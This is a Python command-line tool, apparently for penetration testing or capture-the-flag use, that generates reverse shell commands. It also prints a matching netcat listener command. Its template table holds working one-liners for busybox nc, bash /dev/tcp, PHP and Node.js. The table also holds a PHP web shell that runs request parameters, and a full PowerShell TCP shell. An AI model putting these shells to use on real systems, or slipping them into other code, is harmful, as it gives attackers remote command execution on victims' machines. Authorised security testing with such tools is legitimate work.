#!/bin/python3
import argparse

REV_SHELL_LISTENER = "nc -lvnp {port}"

REV_SHELL_TEMPLATES = {
    "busybox nc": "busybox nc {address} {port} -e /bin/sh",
    "bash -i": "bash -i >& /dev/tcp/{address}/{port} 0>&1",
    "php cmd": "<?php if(isset($_REQUEST[\"cmd\"])){{ echo \"<pre>\"; $cmd = ($_REQUEST[\"cmd\"]); system($cmd); echo \"</pre>\"; die; }}?>",
    "php exec": "php -r '$sock=fsockopen(\"{address}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
    "powershell": "$LHOST = \"{address}\"; $LPORT = ${port}; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) {{ while ($NetworkStream.DataAvailable) {{ $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }}; if ($TCPClient.Connected -and $Code.Length -gt 1) {{ $Output = try {{ Invoke-Expression ($Code) 2>&1 }} catch {{ $_ }}; $StreamWriter.Write(\"$Output`n\"); $Code = $null }} }}; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()",
    "javascript": "require('child_process').exec('nc -e /bin/bash {address} {port}')"
}


def _add_arguments(parser: argparse.ArgumentParser) -> None:
    parser.add_argument("-a", "--address", type=str,
                        required=True,
                        help="Listener IP address")
    parser.add_argument("-p", "--port", type=int,
                        required=True,
                        help="Listener port")
    parser.add_argument("-s", "--shell", type=str,
                        required=True,
                        choices=REV_SHELL_TEMPLATES.keys(),
                        help="Target shell")


def _init_arg_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        prog="rev_shell_gen.py",
        description="CLI tool for crafting reverse shell commands",)
    _add_arguments(parser)
    parser = parser.parse_args()
    return parser


def _print_header() -> None:
    header = """
 _______________________________________
< Shell Yeah! - Reverse Shell Generator >
 ---------------------------------------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\\
                ||----w |
                ||     ||
/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\\
    """
    print(header)


def main() -> None:
    _print_header()

    parser = _init_arg_parser()

    target = None
    try:
        target = REV_SHELL_TEMPLATES[parser.shell.lower()].format(
            address=parser.address, port=parser.port)
    except KeyError:
        error = """
         ____________________
        < Invalid shell type >
        --------------------
                \   ^__^
                 \  (xX)\_______
                    (__)\       )\/\\
                     u ||----w |
                       ||     ||
        """
        exit(1)

    print(f"Listener command:\n{REV_SHELL_LISTENER.format(port=parser.port)}")
    print("")
    print(f"Reverse shell command:\n{target}")


if __name__ == "__main__":
    main()
